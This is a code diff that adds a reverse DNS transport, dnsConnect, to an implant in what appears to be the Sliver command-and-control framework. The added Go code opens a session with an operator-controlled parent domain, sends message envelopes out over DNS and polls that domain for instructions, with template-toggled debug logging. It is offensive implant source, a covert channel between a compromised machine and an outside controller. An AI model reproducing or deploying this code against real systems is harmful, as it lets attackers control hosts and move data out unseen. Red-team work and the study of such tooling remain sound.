@@ -39,14 +39,21 @@ import (
 
 	insecureRand "math/rand"
 	"net"
+	"net/url"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
 	"github.com/golang/protobuf/proto"
+
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 )
 
 const (
@@ -90,6 +97,56 @@ type BlockReassembler struct {
 	ID   string
 	Size int
 	Recv chan *RecvBlock
+}
+
+// dnsConnect - Reverse DNS implant transport.
+func dnsConnect(uri *url.URL) (*Connection, error) {
+	dnsParent := uri.Hostname()
+	// {{if .Config.Debug}}
+	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
+	// {{end}}
+	sessionID, sessionKey, err := dnsStartSession(dnsParent)
+	if err != nil {
+		return nil, err
+	}
+	// {{if .Config.Debug}}
+	log.Printf("Starting new session with id = %s\n", sessionID)
+	// {{end}}
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true // Stop polling
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+	}()
+
+	return connection, nil
 }
 
 // Basic message replay protect, hash the cipher text and store it in a map
